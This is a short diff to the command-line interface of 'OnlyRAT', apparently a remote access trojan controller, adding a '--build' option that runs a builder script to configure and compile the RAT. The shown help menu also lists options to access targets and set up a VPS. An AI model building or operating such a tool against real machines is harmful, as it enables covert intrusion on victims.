@@ -33,6 +33,7 @@ o0    _o0"` '`   NN    NN Ll  Yy,yYY  '^%%&VGh%%%%%&&"^%_,,       "%%%,_      _,
 help_menu = """
         [+] Arguments:
             <username>.rat ------------ Access Target Via Config File
+            -b, --build --------------- Run Advanced Builder (Configure & Compile)
             -d, --dfig <vps_user> ----- Download RAT Config File
             -s, --setup --------------- Setup VPS
             -m, --man ----------------- OnlyRAT Manual
@@ -505,6 +506,10 @@ def cli(arguments):
 
         elif argument in ["--update", "-u"]:
             update()
+            exit()
+
+        elif argument in ["--build", "-b"]:
+            os.system("python3 builder.py")
             exit()
 
         elif argument in ["--remove", "-r", "--uninstall"]:
